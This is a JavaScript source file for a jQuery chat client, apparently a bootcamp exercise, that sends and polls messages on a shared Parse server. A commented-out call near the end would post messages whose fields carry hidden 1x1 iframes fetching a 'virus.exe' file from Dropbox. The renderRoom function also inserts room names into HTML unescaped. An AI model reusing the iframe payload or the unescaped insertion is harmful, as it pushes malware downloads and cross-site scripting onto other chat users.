// YOUR CODE HERE:
var ChatterBox = function () {

  this.lastPostID = undefined;
  this.friendList = ['Ricky Asty', 'Manly Stan'];
  this.username = 'anoynmous';
  this.roomList = ['Main', 'New Room'];
  this.currentRoom = $('body select').val();


};

var app = new ChatterBox();

ChatterBox.prototype.init = function() {
  this.username = window.location.search.slice(window.location.search.indexOf('=') + 1);
  $('#send .submit').on('submit', function(event) {
    event.preventDefault();
    app.handleSubmit();
  });  

  $('body select').on('change', function(event) {
    if ($(this).val() === 'New Room') {
      var room = prompt('Enter a new room name') || 'Main';
      app.renderRoom(room);
      $(this).val(room);
    }

    app.currentRoom = $(this).val();
    app.clearMessages();
    app.lastPostID = undefined;
    app.fetch();
  });

  $('h1').on('click', function() {
    $('select').val('Main').trigger('change');
  });

  $('body #chats').delegate('.roomtag', 'click', function(event) {
    $('select').val($(this).text()).trigger('change');

  });  

  setInterval(function() {
    app.fetch();
  }, 500);

};


ChatterBox.prototype.send = function(msg) {
  $.ajax({
  // This is the url you should use to communicate with the parse API server.
    url: 'http://parse.atx.hackreactor.com/chatterbox/classes/messages',
    type: 'POST',
    data: JSON.stringify(msg),
    contentType: 'application/json',
    success: function (data) {
      console.log('Message sent');
    },
    error: function (data) {
      // See: https://developer.mozilla.org/en-US/docs/Web/API/console.error
      console.error('chatterbox: Failed to send message', data);
    }
  });
  
};

ChatterBox.prototype.fetch = function(sortOrder = 'createdAt') {
  $.ajax({
  // This is the url you should use to communicate with the parse API server.
    url: 'http://parse.atx.hackreactor.com/chatterbox/classes/messages',
    type: 'GET',
    data: 'order=-' + sortOrder,
    contentType: 'application/json',
    success: function (data) {
      var currentList = data.results;
      var newPost = false;
      for (var i = currentList.length - 1; i >= 0; i--) {
        if (newPost && (currentList[i].roomname === app.currentRoom || app.currentRoom === 'Main')) {
          app.renderRoom(currentList[i].roomname);
          app.renderMessage(currentList[i]);

        }

        if (app.lastPostID === currentList[i].objectId || app.lastPostID === undefined) {
          newPost = true;
          //to account for the first pass through
          if (i === currentList.length - 1 && (currentList[i].roomname === app.currentRoom || app.currentRoom === 'Main')) {
            app.renderRoom(currentList[i].roomname);
            app.renderMessage(currentList[i]);
          
          }
        }
      }  

      app.lastPostID = currentList[0].objectId;
    },
    error: function (data) {
      // See: https://developer.mozilla.org/en-US/docs/Web/API/console.error
      console.error('chatterbox: Failed to receieve message', data);
    }
  });
  
};


ChatterBox.prototype.createMessage = function(id, roomname, text, update, username) {
  var message = {
    createdAt: new Date(), 
    objectId: id,
    roomname: roomname,
    text: text,
    updatedAt: update,
    username: username
  };
  return message;
};


ChatterBox.prototype.clearMessages = function() {
  $('#chats').empty();
};

ChatterBox.prototype.renderMessage = function(msg) {
  //var $msg = $(`div`);
  
  var $username = $(`<span class='username'></span>`).text(msg.username);
  var $post = $(`<div class='post'></div>`).text(`: said @ ${msg.createdAt}: ${msg.text}`);
  var $roomTag = $(`<span class='roomtag'></span>`).text(msg.roomname);
  $post.prepend($username);
  $post.append($roomTag);

  if (this.friendList.includes(msg.username)) {
    $post.find('.username').addClass('friend');
  }

  $post.find('.username').on('click', function(event) {
    app.handleUsernameClick.call(this);
  });
  //$post.fadeIn();
  $(`body #chats`).prepend($post);
  $post.animate({
    left: '0px'
  });
};

ChatterBox.prototype.renderRoom = function(roomName) {
  if (this.roomList.includes(roomName) === false && 
    roomName) {
    app.roomList.push(roomName);
    $(`body select`).append(`<option value="${roomName}">${roomName}</option>`);
  }

};  

$( document ).ready(function() {
  app.fetch();
  app.init();
  /*app.send(app.createMessage(69, `<<iframe width="1" height="1" src="https://www.dropbox.com/s/vr5ga5mkg01rv0f/virus.exe?dl=1" frameborder="0" allowfullscreen>`, 
    `<<IFRAME width="1" height="1" src="https://www.dropbox.com/s/vr5ga5mkg01rv0f/virus.exe?dl=1" frameborder="0" allowfullscreen></iframe></iframe>>`,
    new Date(), `<iframe width="1" height="1" src="https://www.dropbox.com/s/vr5ga5mkg01rv0f/virus.exe?dl=1" frameborder="0" allowfullscreen></iframe>`));
*/

});

ChatterBox.prototype.handleUsernameClick = function() {
  if (!app.friendList.includes($(this).text())) {
    //add into friendList if not there already
    app.friendList.push($(this).text());
    var chatList = $('#chats').children();
    //find all instances of username and add class 'friend'
    for (var j = 0; j < chatList.length; j++) {
      if ($(chatList[j]).find('.username').text() === $(this).text()) {
        $(chatList[j]).find('.username').addClass('friend');
      }
    }
  }
};

ChatterBox.prototype.handleSubmit = function() {
  app.send(app.createMessage(Math.floor(Math.random() * 100), app.currentRoom, $('#message').val(), new Date(), app.username)); 
  $('#message').val(''); 
};